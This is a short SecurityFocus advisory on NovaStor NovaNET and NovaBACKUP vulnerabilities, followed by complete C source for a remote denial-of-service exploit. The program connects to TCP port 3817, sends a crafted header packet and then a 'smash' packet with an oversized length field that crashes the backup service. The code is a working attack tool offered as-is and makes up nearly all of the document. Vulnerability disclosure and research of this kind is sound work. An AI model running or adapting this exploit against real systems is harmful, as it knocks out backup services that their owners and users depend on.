source: http://www.securityfocus.com/bid/39693/info
   
NovaStor NovaNET is prone to code-execution, denial-of-service, and information-disclosure vulnerabilities.
   
An attacker can exploit these issues to execute arbitrary code, access sensitive information, or crash the affected application, denying service to legitimate users. Successful attacks may result in the complete compromise of an affected computer.
   
NovaNET 11 and 12 are vulnerable to all of these issue; NovaBACKUP Network 13 is affected by a denial-of-service vulnerability.

/* novanet-dos.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET/NovaBACKUP <= 13.0 remote DoS
 * by mu-b - Tue Oct 2 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0(SP*)
 *              NovaSTOR NovaNET 12.0(SP*)
 *              NovaSTOR NovaNET 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define NOVANET_HDR_SZ        0x14
#define NOVANET_PKT_SZ        0x92
#define NOVANET_MAX_LEN       0x112014

#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static char hdr_pkt[] =
  "\x54\x84\x00\x00"                            /* 04 */
  "\x00\x00\x00\x00"                            /* 08 */
  "\x04\x00\x00\x00"                            /* 0C */
  "\x92\x00\x00\x00"                            /* 10 */
  "\x00\x00\x00\x00"                            /* 14 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 08 */  /* 1C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 10 */  /* 24 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 18 */  /* 2C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 20 */  /* 34 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 28 */  /* 3C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 30 */  /* 44 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 38 */  /* 4C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 40 */  /* 54 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 48 */  /* 5C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 50 */  /* 64 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 58 */  /* 6C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 60 */  /* 74 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 68 */  /* 7C */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 70 */  /* 84 */
  "\x00\x00\x00\x00\x00\x00\x00\x00"  /* 78 */  /* 8C */
  "\x00\x00\x00\x00\x00\x00";         /* 7E */  /* 92 */

static char rem_pkt[] =
  "\x51\x84\x00\x00"    /* 04 */
  "\x00\x00\x00\x30"    /* 08 */
  "\x05\x00\x00\x00"    /* 0C */
  "\x00\x00\x00\x00"    /* 10 */
  "\x00\x00\x00\x00";   /* 14 */

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      fprintf (stderr, "sock_send: send() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      fprintf (stderr, "sock_recv: recv() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      fprintf (stderr, "sockami: socket() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      fprintf (stderr, "sockami: gethostbyname() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      fprintf (stderr, "sockami: connect() - %s\n", strerror (errno));
      return (-1);
    }

  return (fd);
}

int
main (int argc, char **argv)
{
  char rbuf_pkt[NOVANET_PKT_SZ];
  unsigned int rlen;
  int fd, n;

  printf ("NovaSTOR NovaNET remote DoS\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  fd = sockami (argv[1], NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "main: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", argv[1], NOVANET_TCP_PORT);

  printf ("** sending header packet...");
  if ((n = sock_send (fd, hdr_pkt, sizeof hdr_pkt - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "main: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading first reply...");
  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "main: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  srand (time (NULL));
  rlen = NOVANET_MAX_LEN + (rand () % (UINT_MAX - NOVANET_MAX_LEN)) + 1;
  *(unsigned int *) &rem_pkt[12] = rlen;

  printf ("** sending smash packet [remaining length %u-bytes]...", rlen);
  if ((n = sock_send (fd, rem_pkt, sizeof rem_pkt - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "main: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  usleep (USLEEP_TIME);
  close (fd);

  return (EXIT_SUCCESS);
}